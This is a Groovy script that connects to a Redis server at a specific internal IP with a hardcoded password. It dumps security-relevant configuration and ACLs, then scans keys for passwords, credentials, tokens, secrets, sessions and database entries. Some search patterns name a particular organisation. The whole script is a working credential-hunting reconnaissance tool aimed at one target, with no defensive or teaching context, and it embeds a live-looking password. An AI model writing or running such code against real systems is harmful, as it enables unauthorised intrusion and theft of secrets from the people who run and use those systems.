import java.net.Socket
import java.io.BufferedReader
import java.io.InputStreamReader

def redisExec(String host, int port, String password, List<String> commands) {
    def results = [:]
    Socket sock = null
    try {
        sock = new Socket()
        sock.connect(new java.net.InetSocketAddress(host, port), 5000)
        sock.setSoTimeout(8000)
        def os = sock.getOutputStream()
        def br = new BufferedReader(new InputStreamReader(sock.getInputStream()))
        
        os.write("AUTH ${password}\r\n".getBytes())
        os.flush()
        Thread.sleep(300)
        def authResp = readAll(br)
        if (!authResp.contains('+OK')) {
            results['ERROR'] = "AUTH FAILED: ${authResp}"
            return results
        }
        
        commands.each { cmd ->
            os.write("${cmd}\r\n".getBytes())
            os.flush()
            Thread.sleep(500)
            results[cmd] = readAll(br)
        }
    } catch (Exception e) {
        results['CONN_ERROR'] = "${e.class.simpleName}: ${e.message}"
    } finally {
        try { sock?.close() } catch(Exception e) {}
    }
    return results
}

def readAll(BufferedReader br) {
    def sb = new StringBuilder()
    try {
        while (true) {
            if (!br.ready()) { Thread.sleep(300); if (!br.ready()) break }
            def line = br.readLine()
            if (line == null) break
            sb.append(line).append('\n')
        }
    } catch (java.net.SocketTimeoutException e) {}
    return sb.toString().trim()
}

println "=== REDIS CONFIG + KEY SEARCH ==="
println "Target: 172.27.140.151:6379"

def configCmds = [
    "CONFIG GET dir",
    "CONFIG GET dbfilename",
    "CONFIG GET requirepass",
    "CONFIG GET bind",
    "CONFIG GET protected-mode",
    "CONFIG GET save",
    "CONFIG GET logfile",
    "CONFIG GET maxmemory",
    "CONFIG GET slaveof",
    "CONFIG GET rename-command",
    "CONFIG GET lua-time-limit",
    "MODULE LIST",
    "ACL LIST",
    "CLIENT GETNAME",
]

def r1 = redisExec("172.27.140.151", 6379, "@st0rAg3K3Y", configCmds)
r1.each { k, v ->
    println "\n--- ${k} ---"
    println v
}

println "\n${'='*70}"
println "=== SCANNING FOR INTERESTING KEYS ==="

def scanCmds = [
    "SCAN 0 MATCH *password* COUNT 100",
    "SCAN 0 MATCH *cred* COUNT 100",
    "SCAN 0 MATCH *config* COUNT 100",
    "SCAN 0 MATCH *mysql* COUNT 100",
    "SCAN 0 MATCH *db* COUNT 100",
    "SCAN 0 MATCH *sears* COUNT 100",
    "SCAN 0 MATCH *t1pago* COUNT 100",
    "SCAN 0 MATCH *t1* COUNT 100",
    "SCAN 0 MATCH *secret* COUNT 100",
    "SCAN 0 MATCH *token* COUNT 100",
    "SCAN 0 MATCH *auth* COUNT 100",
    "SCAN 0 MATCH *key* COUNT 100",
    "SCAN 0 MATCH *admin* COUNT 100",
    "SCAN 0 MATCH *user* COUNT 100",
    "SCAN 0 MATCH *host* COUNT 100",
    "SCAN 0 MATCH *conn* COUNT 100",
    "SCAN 0 MATCH *session* COUNT 100",
    "SCAN 0 MATCH *api* COUNT 100",
    "SCAN 0 MATCH *redis* COUNT 100",
    "SCAN 0 MATCH *prod* COUNT 100",
]

def r2 = redisExec("172.27.140.151", 6379, "@st0rAg3K3Y", scanCmds)
r2.each { k, v ->
    if (v && v.trim() && !v.contains('*0') && v.split('\n').size() > 3) {
        println "\n--- ${k} ---"
        println v
    } else if (v && v.trim()) {
        println "\n--- ${k} --- (${v.contains('*0') ? 'EMPTY' : v.split('\\n').size() + ' lines'})"
    }
}

println "\n=== CONFIG + SCAN DONE ==="
